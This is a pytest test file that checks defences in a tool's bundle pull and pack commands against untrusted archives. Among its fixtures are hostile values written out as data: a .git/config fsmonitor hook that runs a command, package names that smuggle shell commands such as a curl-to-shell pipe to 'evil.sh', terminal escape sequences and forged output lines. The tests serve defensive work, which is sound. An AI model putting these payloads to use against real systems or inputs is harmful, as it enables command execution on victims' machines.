"""``mime pull`` and ``mime pack`` against a stranger's bundle: what a saved folder may hold, what is printed from a
bundle's text, and how much a download may be.

A bundle comes from a stranger, so every check here is a security boundary: a refusal names what it refused and leaves
nothing behind. The plants are the review's own (a ``.git/config`` that runs a command on ``git status``, a package name
that is a second shell command, an escape sequence, a forged summary line, a server that sends a thousand times what the
lock declares), and the controls remove each check in turn: with it gone the plant must get through, every one of
twenty runs.
"""

import json
import os
import shlex
import shutil
import stat
import subprocess
import unicodedata
from collections.abc import Callable, Iterator
from contextlib import contextmanager
from pathlib import Path

import pytest
from assets_rig import Rig, reference
from bundles import write_bundle
from fake_zenodo import DOI, zenodo

from mime import _terminal, assets
from mime.assets import _fetch
from mime.build import BuildRefused
from mime.cli import main
from mime.saved import _bundle, _folder, _pull, pack, pull
from mime.testing.toys import full_toy

RUNS = 20
ESCAPE = "\x1b"


@pytest.fixture(scope="module")
def saved_toy(tmp_path_factory: pytest.TempPathFactory) -> Path:
    folder = tmp_path_factory.mktemp("toy") / "full_toy"
    full_toy().save(folder)
    return folder


def files_of(folder: Path) -> dict[str, bytes]:
    return {path.relative_to(folder).as_posix(): path.read_bytes() for path in folder.rglob("*") if path.is_file()}


def codes_of(action: Callable[[], object]) -> list[str]:
    try:
        action()
    except BuildRefused as refused:
        return refused.codes()
    raise AssertionError("not refused")


def left_behind(root: Path) -> list[str]:
    return sorted(str(each.relative_to(root)) for each in root.rglob("*"))


def lock_with(files: dict[str, bytes], change: Callable[[dict[str, object]], None]) -> dict[str, bytes]:
    lock = json.loads(files["mime.lock"])
    change(lock)
    return {**files, "mime.lock": (json.dumps(lock, indent=1, sort_keys=True) + "\n").encode("utf-8")}


# --- B1: what a saved folder holds ------------------------------------------------------------------------------------


#: What the review planted, and its relatives: a path part that starts with a dot, a file no saved folder holds, a place
#: the saved form keeps nothing, a folder where a file goes, a name a filesystem treats specially.
HOSTILE_MEMBERS = {
    ".git/config": b"[core]\n\tfsmonitor = touch pwned\n",
    ".git/HEAD": b"ref: refs/heads/main\n",
    ".git/objects/.keep": b"",
    ".env": b"SECRET=1\n",
    ".envrc": b"export X=1\n",
    ".ssh/authorized_keys": b"ssh-ed25519 AAAA stranger\n",
    ".vscode/tasks.json": b"{}\n",
    ".gitattributes": b"* filter=evil\n",
    "records/.hidden": b"x",
    "scene/layers/.deep/.hidden": b"x",
    "descriptions/.git/config": b"[core]\n",
    "notes.txt": b"a stray file",
    "scene/other.usda": b"#usda 1.0\n",
    "records/sub/deeper.json": b"{}",
    "records/CON": b"x",
    "records/nul.json": b"x",
    "records/Com1.txt": b"x",
    "records/a:b.json": b"x",
    "records/ends.": b"x",
    "records/" + "n" * 300: b"x",
}


def hostile_bundle(saved: Path, tmp_path: Path, name: str, data: bytes) -> Path:
    return write_bundle(tmp_path / "hostile.mimebundle", {**files_of(saved), name: data}, "full_toy")


@pytest.mark.parametrize("name", HOSTILE_MEMBERS)
def test_a_member_a_saved_folder_does_not_hold_is_refused_and_nothing_is_left(saved_toy: Path, tmp_path: Path, name: str):
    bundle = hostile_bundle(saved_toy, tmp_path, name, HOSTILE_MEMBERS[name])
    before = left_behind(tmp_path)
    assert codes_of(lambda: pull(bundle, into=tmp_path / "out")) == ["bundle.unsafe"]
    assert left_behind(tmp_path) == before, "the refused pull left something behind"


def test_the_review_plant_never_reaches_a_folder_git_would_read(saved_toy: Path, tmp_path: Path):
    """A ``.git`` directory with a ``core.fsmonitor`` runs its command on ``git status``; the folder it was to be written
    into must not exist, so that no shell prompt can run it."""
    marker = tmp_path / "pwned"
    config = f"[core]\n\tfsmonitor = touch {marker}\n".encode()
    bundle = write_bundle(tmp_path / "hostile.mimebundle", {
        **files_of(saved_toy), ".git/HEAD": b"ref: refs/heads/main\n", ".git/config": config,
        ".git/objects/.keep": b"", ".git/refs/.keep": b""}, "full_toy")
    assert set(codes_of(lambda: pull(bundle, into=tmp_path / "out"))) == {"bundle.unsafe"}
    assert not (tmp_path / "out").exists() and not marker.exists()


def test_a_file_the_lock_does_not_name_is_refused_even_where_a_folder_holds_files(saved_toy: Path, tmp_path: Path):
    """A name inside ``records/`` is in the layout, but only the records the lock pins are the saved form's."""
    bundle = hostile_bundle(saved_toy, tmp_path, "records/extra.json", b"{}")
    assert codes_of(lambda: pull(bundle, into=tmp_path / "out")) == ["bundle.unsafe"]
    assert not (tmp_path / "out").exists()


def test_a_lock_that_names_a_file_outside_the_layout_is_refused_before_it_is_read(saved_toy: Path, tmp_path: Path):
    files = lock_with(files_of(saved_toy), lambda lock: lock["reference"].update(file="/etc/passwd"))  # type: ignore[attr-defined]
    bundle = write_bundle(tmp_path / "hostile.mimebundle", files, "full_toy")
    assert codes_of(lambda: pull(bundle, into=tmp_path / "out")) == ["load.lock-shape"]
    assert not (tmp_path / "out").exists()


def test_a_member_written_where_another_is_a_folder_is_a_refusal_and_not_a_traceback(saved_toy: Path, tmp_path: Path,
                                                                                   monkeypatch: pytest.MonkeyPatch):
    """With the layout check out of the way, a file and a folder of one name are still a refusal."""
    monkeypatch.setattr(_bundle, "name_problem", lambda name: None)
    monkeypatch.setattr(_bundle, "member_problem", lambda name: None)
    files = {**files_of(saved_toy), "scene": b"a file", }
    bundle = write_bundle(tmp_path / "hostile.mimebundle", files, "full_toy")
    before = left_behind(tmp_path)
    assert codes_of(lambda: pull(bundle, into=tmp_path / "out")) == ["bundle.unsafe"]
    assert left_behind(tmp_path) == before


def test_names_that_are_one_name_on_macos_and_windows_are_refused_everywhere(saved_toy: Path, tmp_path: Path):
    base = files_of(saved_toy)
    pairs = [("scene/layers/a.usda", "scene/layers/A.usda"), ("records/e\u0301.json", "records/\u00e9.json"),
             ("records/straSSe.json", "records/STRASSE.json")]
    for one, other in pairs:
        bundle = write_bundle(tmp_path / "collision.mimebundle", {**base, one: b"1", other: b"2"}, "full_toy")
        codes = codes_of(lambda: pull(bundle, into=tmp_path / "out"))
        assert "bundle.unsafe" in codes, (one, other, codes)
        assert not (tmp_path / "out").exists()
    assert _bundle.collisions(["MIME.LOCK", "mime.lock"]) == [("MIME.LOCK", "mime.lock")]


def test_a_manifest_nested_a_hundred_thousand_deep_is_a_refusal_and_not_a_recursion_error(saved_toy: Path, tmp_path: Path):
    import zipfile

    from bundles import member

    path = tmp_path / "deep.mimebundle"
    with zipfile.ZipFile(path, "w", zipfile.ZIP_STORED) as archive:
        member(archive, "manifest.json", b"[" * 100_000 + b"]" * 100_000)
    assert codes_of(lambda: pull(path, into=tmp_path / "out")) == ["bundle.manifest"]
    assert not (tmp_path / "out").exists()


def test_a_document_nested_deeply_is_a_refusal_and_not_a_recursion_error(saved_toy: Path, tmp_path: Path):
    files = {**files_of(saved_toy), "experiment.mime.yaml": b"a: " + b"[" * 50_000 + b"]" * 50_000 + b"\n"}
    bundle = write_bundle(tmp_path / "deep.mimebundle", files, "full_toy")
    refused = codes_of(lambda: pull(bundle, into=tmp_path / "out"))
    assert refused and set(refused) <= {"bundle.manifest", "load.document-yaml", "load.document-shape"}, refused
    assert not (tmp_path / "out").exists()


def stray_in_folder(folder: Path, name: str, data: bytes) -> None:
    (folder / name).parent.mkdir(parents=True, exist_ok=True)
    (folder / name).write_bytes(data)


@pytest.fixture
def folder(saved_toy: Path, tmp_path: Path) -> Path:
    return Path(shutil.copytree(saved_toy, tmp_path / "work" / "full_toy"))


@pytest.mark.parametrize("name", [".env", ".git/config", ".DS_Store", ".vscode/settings.json", ".ssh/id_ed25519",
                                  "records/.hidden", "scene/layers/.deep/.hidden", "notes.txt", "Thumbs.db",
                                  "descriptions/unlisted.urdf", "records/CON.json"])
def test_pack_does_not_carry_what_a_saved_folder_does_not_hold(folder: Path, name: str):
    stray_in_folder(folder, name, b"SECRET=hunter2\n")
    assert codes_of(lambda: pack(folder)) == ["bundle.stray-file"]
    assert not list(folder.parent.glob("*.mimebundle")) and not list(folder.parent.glob(".*"))


def test_pack_names_each_stray_file_and_carries_nothing_when_a_folder_is_clean_again(folder: Path):
    stray_in_folder(folder, ".env", b"A=1")
    stray_in_folder(folder, ".git/config", b"[core]")
    try:
        pack(folder)
    except BuildRefused as refused:
        assert ".env" in str(refused) and ".git/config" in str(refused)
    else:
        raise AssertionError("not refused")
    (folder / ".env").unlink()
    shutil.rmtree(folder / ".git")
    assert pack(folder).is_file()


def test_pack_refuses_names_that_collide_on_a_case_insensitive_filesystem(folder: Path):
    stray_in_folder(folder, "records/A.json", b"{}")
    stray_in_folder(folder, "records/a.json", b"{}")
    real = _bundle.named_files
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(_bundle, "named_files", lambda form: real(form) | {"records/A.json", "records/a.json"})
        assert codes_of(lambda: pack(folder)) == ["bundle.name-collision"]


def test_pack_dot_from_inside_the_folder_is_a_pack_and_not_a_traceback(folder: Path, monkeypatch: pytest.MonkeyPatch,
                                                                       capsys: pytest.CaptureFixture[str]):
    monkeypatch.chdir(folder)
    assert main(["pack", "."]) == 0
    assert "full_toy.mimebundle" in capsys.readouterr().out and (folder.parent / "full_toy.mimebundle").is_file()
    assert pack(".").read_bytes() == (folder.parent / "full_toy.mimebundle").read_bytes()
    monkeypatch.chdir(folder.parent)
    assert main(["pack", "full_toy/../full_toy/"]) == 0


def test_pack_of_a_folder_that_is_not_a_saved_experiment_is_a_refusal(tmp_path: Path, capsys: pytest.CaptureFixture[str]):
    (tmp_path / "empty").mkdir()
    assert main(["pack", str(tmp_path / "empty")]) == 2
    assert "load." in capsys.readouterr().err


# --- B2: what the lock may name, and what reaches a terminal ---------------------------------------------------------------------


def with_distribution(files: dict[str, bytes], name: str, version: str) -> dict[str, bytes]:
    def change(lock: dict[str, object]) -> None:
        entries = lock["entries"]
        assert isinstance(entries, list)
        entries[0].update(distribution=name, distribution_version=version)

    return lock_with(files, change)


INJECTIONS = [
    ('x"; touch /tmp/pwn; "', "1.0"),
    ("mime-srl", '1" ; curl evil.sh | sh ; "'),
    ("mime-srl", "1.0\n"),
    ("mime-srl", "1.0; touch x"),
    ("mime-srl", "$(touch x)"),
    ("mime-srl", "1.0`touch x`"),
    ("mime-srl\n  - Packages: all installed", "1.0"),
    (f"mime-srl{ESCAPE}[2J{ESCAPE}]0;owned\x07", "1.0"),
    ("mime-srl", f"1.0{ESCAPE}[2J"),
    ("mime srl", "1.0"),
    ("-r requirements.txt", "1.0"),
    ("mime-srl==1.0 --index-url http://evil", "1.0"),
    ("", "1.0"),
    ("mime-srl", ""),
    ("mime-srl", "not a version"),
    ("mime-srl", "‮1.0"),
    ("mime‮srl", "1.0"),
]


@pytest.mark.parametrize(("name", "version"), INJECTIONS, ids=[repr(each)[:40] for each in INJECTIONS])
def test_a_lock_naming_a_distribution_or_version_that_is_not_one_is_refused_and_prints_nothing_raw(
        saved_toy: Path, tmp_path: Path, name: str, version: str, capsys: pytest.CaptureFixture[str]):
    bundle = write_bundle(tmp_path / "hostile.mimebundle", with_distribution(files_of(saved_toy), name, version),
                          "full_toy")
    assert main(["pull", str(bundle), "--into", str(tmp_path / "out"), "--no-assets"]) == 2
    out, err = capsys.readouterr()
    assert not (tmp_path / "out").exists()
    assert "load.lock-shape" in err and "pip install" not in out + err
    for character in (ESCAPE, "\x07", "‮"):
        assert character not in out + err, "a control character reached the terminal"
    assert not [line for line in (out + err).splitlines() if line.startswith("  - Packages")], "a forged summary line"


@pytest.mark.parametrize(("name", "version"), [("Jinja2", "3.1.4"), ("zope.interface", "6.4.post2"), ("a_b-c", "1.0"),
                                               ("x", "1!2.0"), ("mime-srl", "1.0+local.1"), ("mime-srl", "0.3.0.dev4"),
                                               ("A", "1.0rc1")])
def test_the_names_and_versions_distributions_really_have_are_accepted(saved_toy: Path, tmp_path: Path, name: str,
                                                                       version: str):
    bundle = write_bundle(tmp_path / "fine.mimebundle", with_distribution(files_of(saved_toy), name, version), "full_toy")
    lines: list[str] = []
    pull(bundle, into=tmp_path / "out", say=lines.append)
    needed = lines[-1].splitlines()[3]
    command = needed.partition(": pip install ")[2].partition(" (the bundle")[0].split(" ")
    assert shlex.quote(f"{name}=={version}") in command


def test_the_printed_command_quotes_what_a_shell_would_read_as_more_than_one_word():
    """Even a name the validation let through is quoted: a version with an epoch carries a character a shell reads."""
    line = _pull._packages_line([("x", "1!2.0", None), ("a; touch b", "1.0", None)])
    command = line.partition(": pip install ")[2].partition(" (the bundle")[0]
    assert shlex.split(command) == ["x==1!2.0", "a; touch b==1.0"]
    assert "'x==1!2.0'" in command, "a '!' is quoted"


def test_the_summary_says_the_packages_come_from_the_bundles_author(saved_toy: Path, tmp_path: Path):
    bundle = write_bundle(tmp_path / "b.mimebundle", with_distribution(files_of(saved_toy), "mime-srl", "0.2.1"), "full_toy")
    lines: list[str] = []
    pull(bundle, into=tmp_path / "out", say=lines.append)
    assert "the bundle's author chose these" in lines[-1]


def test_a_bundle_named_with_an_escape_sequence_prints_it_as_text(saved_toy: Path, tmp_path: Path, capsys: pytest.CaptureFixture[str],
                                                                monkeypatch: pytest.MonkeyPatch):
    monkeypatch.chdir(tmp_path)
    bundle = write_bundle(tmp_path / "named.mimebundle", files_of(saved_toy), f"x{ESCAPE}[2J\nNext: rm -rf x")
    assert main(["pull", str(bundle), "--into", "out", "--no-assets"]) == 0
    out = capsys.readouterr().out
    assert ESCAPE not in out and not [line for line in out.splitlines() if line.startswith("Next: rm")]
    assert (tmp_path / "out" / "mime.lock").is_file()


def test_a_refusal_that_carries_a_strangers_text_prints_its_controls_as_text(capsys: pytest.CaptureFixture[str],
                                                                           monkeypatch: pytest.MonkeyPatch):
    from mime import saved
    from mime.build import Refusal, RefusalClass

    def refusing(*arguments: object, **keywords: object) -> Path:
        raise BuildRefused([Refusal("asset.unreachable", RefusalClass.ENVIRONMENT, f"x{ESCAPE}[2J\u009b31m\x07 end",
                                    "try again")])

    monkeypatch.setattr(saved, "pull", refusing)
    assert main(["pull", "somewhere.mimebundle"]) == 2
    err = capsys.readouterr().err
    assert all(character not in err for character in (ESCAPE, "\u009b", "\x07")) and "\\x1b[2J" in err


def test_plain_writes_every_character_that_acts_on_a_terminal_as_its_escape():
    hostile = f"a{ESCAPE}[2J\nb\tc\r\u0085‮ \x00\u009b d"
    text = _terminal.plain(hostile)
    assert text.isascii() and text.isprintable()
    assert _terminal.for_terminal("keep\nlines\tand tabs") == "keep\nlines\tand tabs"
    assert _terminal.for_terminal(hostile).count("\n") == 1
    assert _terminal.plain("é à ü ñ 漢字") == "é à ü ñ 漢字", "printable text in any script is left alone"


# --- W1: a declared size holds while the file downloads -----------------------------------------------------------------------


BODY = os.urandom(600_000)
TABLE = os.urandom(900)
SLACK = 64 * 1024


class Received:
    """How much of a download a client took before it stopped, read from the file object it wrote to."""

    def __init__(self, patch: pytest.MonkeyPatch) -> None:
        self.most = 0
        outer = self
        real = _fetch._Capped.write

        def counting(self: _fetch._Capped, chunk: bytes) -> int:
            outer.most = max(outer.most, self.received + len(chunk))
            return real(self, chunk)

        patch.setattr(_fetch._Capped, "write", counting)


def a_declared_size_is_enforced(rig: Rig) -> None:
    """The review's case: a lock declares 900 bytes and the server sends 600 kB."""
    rig.server.files["/t/table.bin"] = BODY
    declared = reference(TABLE, rig.server.url("/t/table.bin"), name="table")
    with pytest.MonkeyPatch.context() as patch:
        seen = Received(patch)
        outcome = _outcome(declared)
    if isinstance(outcome, BuildRefused):
        refused = outcome
        assert refused.codes() == ["asset.size-exceeded"], refused.codes()
        assert seen.most <= declared.size + SLACK, f"{seen.most} bytes were taken for a declared {declared.size}"
        assert not assets.is_cached(declared), "something was stored"
        assert [each.name for each in rig.cache.iterdir() if not each.name.endswith(".lock")] == [], "something was left"
        return
    raise AssertionError("a download over the declared size was accepted")


def _outcome(declared: assets.AssetRef) -> BuildRefused | Path:
    try:
        return assets.fetch(declared)
    except BuildRefused as refused:
        return refused


def test_a_download_stops_once_it_passes_the_size_the_lock_declares(rig: Rig):
    a_declared_size_is_enforced(rig)


def test_a_download_of_exactly_the_declared_size_is_accepted(rig: Rig):
    rig.server.files["/t/table.bin"] = TABLE
    declared = reference(TABLE, rig.server.url("/t/table.bin"), name="table")
    assert assets.fetch(declared).read_bytes() == TABLE


def test_a_pull_stops_a_download_over_a_declared_size_and_the_confirmation_counts_what_arrives(
        saved_toy: Path, tmp_path: Path, rig: Rig, monkeypatch: pytest.MonkeyPatch):
    """The confirmation asks about declared sizes; the enforcement is what makes the declared size the size."""
    rig.server.files["/t/table.bin"] = BODY
    declared = reference(TABLE, rig.server.url("/t/table.bin"), name="table")
    files = files_of(saved_toy)
    lock = json.loads(files["mime.lock"])
    lock["assets"] = [declared.to_record()]
    files["mime.lock"] = (json.dumps(lock, indent=1, sort_keys=True) + "\n").encode()
    bundle = write_bundle(tmp_path / "declares.mimebundle", files, "full_toy", [declared.to_record()])
    with pytest.MonkeyPatch.context() as patch:
        seen = Received(patch)
        assert codes_of(lambda: pull(bundle, into=tmp_path / "out")) == ["asset.size-exceeded"]
    assert seen.most <= declared.size + SLACK and (tmp_path / "out" / "mime.lock").is_file()


def test_a_bundle_at_an_address_with_no_stated_size_is_held_to_a_named_cap(saved_toy: Path, tmp_path: Path, rig: Rig,
                                                                         capsys: pytest.CaptureFixture[str]):
    bundle = pack(saved_toy, out=tmp_path / "full_toy.mimebundle")
    rig.server.files["/b/full_toy.mimebundle"] = bundle.read_bytes()
    address = rig.server.url("/b/full_toy.mimebundle")
    size = bundle.stat().st_size
    assert assets.RETRIEVE_LIMIT_BYTES == 500_000_000
    assert codes_of(lambda: pull(address, into=tmp_path / "out", max_bundle_bytes=size - 1)) == ["asset.size-exceeded"]
    assert not (tmp_path / "out").exists() and not list(rig.cache.glob("[0-9a-f]" * 64))
    assert main(["pull", address, "--into", str(tmp_path / "out"), "--no-assets", "--max-bundle-bytes", str(size - 1)]) == 2
    assert "--max-bundle-bytes" in capsys.readouterr().err, "the refusal does not say how to raise the cap"
    assert pull(address, into=tmp_path / "out", max_bundle_bytes=size).is_dir()


def test_a_record_that_states_a_size_holds_the_download_to_it(saved_toy: Path, tmp_path: Path, rig: Rig):
    bundle = pack(saved_toy, out=tmp_path / "full_toy.mimebundle")
    data = bundle.read_bytes()
    with zenodo(rig, {"full_toy.mimebundle": data}):
        rig.server.files["/zenodo/api/records/4242"] = json.dumps({"id": 4242, "files": [
            {"key": "full_toy.mimebundle", "checksum": "md5:" + __import__("hashlib").md5(data).hexdigest(),
             "size": 1000, "links": {"self": "https://zenodo.org/api/records/4242/files/full_toy.mimebundle/content"}}]}).encode()
        assert codes_of(lambda: pull(DOI, into=tmp_path / "out")) == ["asset.size-exceeded"]
    assert not (tmp_path / "out").exists() and not list(rig.cache.glob("[0-9a-f]" * 64))


def test_a_record_that_states_a_size_over_the_cap_is_refused_before_the_file_is_requested(saved_toy: Path, tmp_path: Path,
                                                                                         rig: Rig):
    data = pack(saved_toy, out=tmp_path / "full_toy.mimebundle").read_bytes()
    with zenodo(rig, {"full_toy.mimebundle": data}):
        before = [request for request in rig.server.requests if "content" in request]
        assert codes_of(lambda: pull(DOI, into=tmp_path / "out", max_bundle_bytes=len(data) - 1)) == ["asset.size-exceeded"]
        assert [request for request in rig.server.requests if "content" in request] == before, "the file was requested"


# --- the order of checks -------------------------------------------------------------------------------------------------


def the_destination_is_checked_before_anything_is_downloaded(rig: Rig, root: Path, bundle: bytes) -> None:
    rig.server.files["/b/x.mimebundle"] = bundle
    (root / "taken").mkdir(exist_ok=True)
    (root / "taken" / "mine.txt").write_text("mine", encoding="utf-8")
    before = rig.requests
    assert codes_of(lambda: pull(rig.server.url("/b/x.mimebundle"), into=root / "taken")) == ["pull.destination"]
    assert rig.requests == before, "the bundle was downloaded before the destination was checked"
    assert not list(rig.cache.glob("[0-9a-f]" * 64))


def test_pull_checks_the_destination_before_it_downloads(saved_toy: Path, tmp_path: Path, rig: Rig):
    the_destination_is_checked_before_anything_is_downloaded(
        rig, tmp_path, pack(saved_toy, out=tmp_path / "b.mimebundle").read_bytes())


# --- the controls ------------------------------------------------------------------------------------------------------------


@contextmanager
def layout_check_skipped() -> Iterator[None]:
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(_bundle, "layout_problem", lambda name: None)
        patch.setattr(_bundle, "member_problem", lambda name: None)
        patch.setattr(_bundle, "named_files", lambda form: {path.relative_to(form.folder).as_posix()
                                                            for path in form.folder.rglob("*") if path.is_file()})
        yield


@contextmanager
def stray_check_skipped() -> Iterator[None]:
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(_bundle, "_stray_files", lambda files, named: [])
        yield


@contextmanager
def lock_text_check_skipped() -> Iterator[None]:
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(_folder, "lock_text_problems", lambda lock: [])
        yield


@contextmanager
def quoting_skipped() -> Iterator[None]:
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(_pull.shlex, "quote", lambda text: text)
        yield


@contextmanager
def terminal_text_left_raw() -> Iterator[None]:
    with pytest.MonkeyPatch.context() as patch:
        import mime.cli

        patch.setattr(mime.cli, "for_terminal", lambda text: text)
        yield


@contextmanager
def size_cap_removed() -> Iterator[None]:
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(_fetch._Capped, "write", lambda self, chunk: (setattr(self, "received", self.received + len(chunk)),
                                                                    self._stream.write(chunk))[1])
        yield


@contextmanager
def destination_checked_late() -> Iterator[None]:
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(_pull, "destination_problem", lambda into: None)
        yield


def planted(tmp_path: Path, scenario: Callable[[Path], None], plant: Callable[[], object]) -> int:
    """How many of twenty runs the scenario's assertions caught the plant in."""
    detected = 0
    for run in range(RUNS):
        root = tmp_path / str(run)
        root.mkdir(parents=True)
        try:
            with plant():  # type: ignore[attr-defined]
                scenario(root)
        except (AssertionError, BuildRefused, OSError):
            detected += 1
    return detected


def pull_refuses_a_dot_git_directory(saved: Path, root: Path) -> None:
    bundle = write_bundle(root / "hostile.mimebundle", {**files_of(saved), ".git/config": b"[core]\n\tfsmonitor = x\n",
                                                          ".git/HEAD": b"ref: x\n"}, "full_toy")
    try:
        pull(bundle, into=root / "out")
    except BuildRefused as refused:
        assert set(refused.codes()) == {"bundle.unsafe"} and not (root / "out").exists()
        return
    raise AssertionError(f"a .git directory was unpacked ({sorted(p.name for p in (root / 'out').iterdir())})")


def pack_refuses_an_env_file(saved: Path, root: Path) -> None:
    work = Path(shutil.copytree(saved, root / "work" / "full_toy"))
    (work / ".env").write_text("SECRET=1\n", encoding="utf-8")
    try:
        bundle = pack(work)
    except BuildRefused as refused:
        assert refused.codes() == ["bundle.stray-file"]
        return
    raise AssertionError(f".env was packed ({'.env' in _bundle_names(bundle)})")


def _bundle_names(bundle: Path) -> list[str]:
    import zipfile

    return zipfile.ZipFile(bundle).namelist()


def pull_refuses_an_injected_name(saved: Path, root: Path) -> None:
    bundle = write_bundle(root / "hostile.mimebundle",
                          with_distribution(files_of(saved), 'x"; touch /tmp/pwn; "', '1" ; curl evil.sh | sh ; "'),
                          "full_toy")
    lines: list[str] = []
    try:
        pull(bundle, into=root / "out", say=lines.append)
    except BuildRefused as refused:
        assert set(refused.codes()) == {"load.lock-shape"}
        return
    raise AssertionError("an injected name was printed: " + lines[-1].splitlines()[3])


def quoting_holds(root: Path) -> None:
    command = _pull._packages_line([("a; touch b", "1.0", None)]).partition(": pip install ")[2].partition(" (the bundle")[0]
    assert shlex.split(command) == ["a; touch b==1.0"]


def terminal_text_is_plain(root: Path) -> None:
    from mime import saved
    from mime.build import Refusal, RefusalClass

    def refusing(*arguments: object, **keywords: object) -> Path:
        raise BuildRefused([Refusal("asset.unreachable", RefusalClass.ENVIRONMENT, f"x{ESCAPE}[2J end", "try again")])

    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(saved, "pull", refusing)
        import contextlib
        import io

        error = io.StringIO()
        with contextlib.redirect_stderr(error):
            assert main(["pull", "somewhere.mimebundle"]) == 2
        assert ESCAPE not in error.getvalue(), "an escape sequence reached the terminal"


def test_control_a_skipped_layout_check_lets_a_dot_git_directory_through_every_run(saved_toy: Path, tmp_path: Path):
    assert planted(tmp_path, lambda root: pull_refuses_a_dot_git_directory(saved_toy, root), layout_check_skipped) == RUNS


def test_control_a_skipped_stray_check_lets_an_env_file_be_packed_every_run(saved_toy: Path, tmp_path: Path):
    assert planted(tmp_path, lambda root: pack_refuses_an_env_file(saved_toy, root), stray_check_skipped) == RUNS


def test_control_a_skipped_lock_check_lets_an_injected_name_be_printed_every_run(saved_toy: Path, tmp_path: Path):
    assert planted(tmp_path, lambda root: pull_refuses_an_injected_name(saved_toy, root), lock_text_check_skipped) == RUNS


def test_control_skipped_quoting_is_detected_every_run(tmp_path: Path):
    assert planted(tmp_path, quoting_holds, quoting_skipped) == RUNS


def test_control_terminal_text_left_raw_is_detected_every_run(tmp_path: Path):
    assert planted(tmp_path, terminal_text_is_plain, terminal_text_left_raw) == RUNS


def test_control_a_removed_size_cap_is_detected_every_run(tmp_path: Path, rig: Rig):
    detected = 0
    for run in range(RUNS):
        try:
            with size_cap_removed():
                a_declared_size_is_enforced(rig)
        except (AssertionError, BuildRefused):
            detected += 1
        shutil.rmtree(rig.cache, ignore_errors=True)
    assert detected == RUNS


def test_control_a_destination_checked_late_is_detected_every_run(saved_toy: Path, tmp_path: Path, rig: Rig):
    data = pack(saved_toy, out=tmp_path / "b.mimebundle").read_bytes()
    detected = 0
    for run in range(RUNS):
        root = tmp_path / str(run)
        root.mkdir()
        try:
            with destination_checked_late():
                the_destination_is_checked_before_anything_is_downloaded(rig, root, data)
        except AssertionError:
            detected += 1
        shutil.rmtree(rig.cache, ignore_errors=True)
    assert detected == RUNS


def test_the_scenarios_pass_unplanted_twenty_times(saved_toy: Path, tmp_path: Path, rig: Rig):
    data = pack(saved_toy, out=tmp_path / "b.mimebundle").read_bytes()
    for run in range(RUNS):
        root = tmp_path / str(run)
        root.mkdir()
        pull_refuses_a_dot_git_directory(saved_toy, root)
        pack_refuses_an_env_file(saved_toy, root)
        pull_refuses_an_injected_name(saved_toy, root)
        quoting_holds(root)
        terminal_text_is_plain(root)
        a_declared_size_is_enforced(rig)
        shutil.rmtree(rig.cache, ignore_errors=True)
        the_destination_is_checked_before_anything_is_downloaded(rig, root, data)
        shutil.rmtree(rig.cache, ignore_errors=True)
